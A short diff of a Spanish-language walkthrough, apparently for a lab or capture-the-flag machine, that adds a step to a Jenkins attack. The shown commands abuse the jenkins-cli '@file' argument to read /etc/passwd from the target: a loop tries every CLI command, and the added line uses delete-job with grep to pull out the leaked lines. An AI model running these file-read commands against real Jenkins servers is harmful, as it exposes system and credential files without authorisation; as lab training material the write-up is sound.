@@ -129,7 +129,10 @@ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node @/etc/passwd
 for command in $(java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 2>&1 | grep -v "    " | xargs | tr ' ' '\n'); do echo "[+] Para el comando $command: $(java -jar jenkins-cli.jar -s http://10.10.11.10:8080 $command @/etc/passwd 2>&1 | wc -l)"; done
 ```
 
-- 
+- Despues de ver cual nos devuelve mas lineas, realizamos el siguiente comando para ver las rutas de cada nombre como **root, www-data, etc**
+```
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/etc/passwd 2>&1 | grep -oP "'.*?'"
+```
 
 
 - Si no funciona de esa manera abrimos el burpsuite para ver un poco mas de información 
